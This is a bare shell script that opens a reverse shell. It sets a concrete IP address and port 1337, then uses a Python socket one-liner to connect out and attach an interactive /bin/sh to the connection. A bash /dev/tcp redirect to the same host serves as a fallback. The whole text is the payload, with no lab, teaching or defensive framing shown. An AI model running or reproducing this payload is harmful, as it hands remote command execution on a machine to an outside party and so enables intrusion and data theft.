IP="77.90.14.157"
PORT="1337"

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'${IP}'",'$PORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' || /bin/sh -i >& /dev/tcp/${IP}/${PORT} 0>&1
